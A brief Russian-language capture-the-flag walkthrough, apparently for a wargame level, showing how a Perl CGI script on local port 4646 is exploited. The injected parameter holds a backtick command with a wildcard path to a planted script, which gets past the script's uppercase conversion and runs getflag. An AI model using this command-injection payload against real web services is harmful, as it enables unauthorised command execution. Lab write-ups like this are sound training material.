1. vim level12.pl Видим что это сервер apache с CGI
2. В настройка apache видим что работает сервер на порту 4646
3. В скрипте видим что принимает два параметра x и y
4. x отправляется по скрипту и выполняется с командой egrep
5. Нужно подсунуть в команду getflag пройдя преобразования по regexp
6. Тупо подставив команду не пройдет так как сработают преобразования. Поэтому подсовываем путь к выполнению скрипта с заглавными буквами
7. vim /tmp/SCRIPT
getflag > /tmp/token
chmod 777 /tmp/SCRIPT
8. curl 127.0.0.1:4646?x="\`/*/SCRIPT\`"
9. cat /tmp/token Видим токен от level13
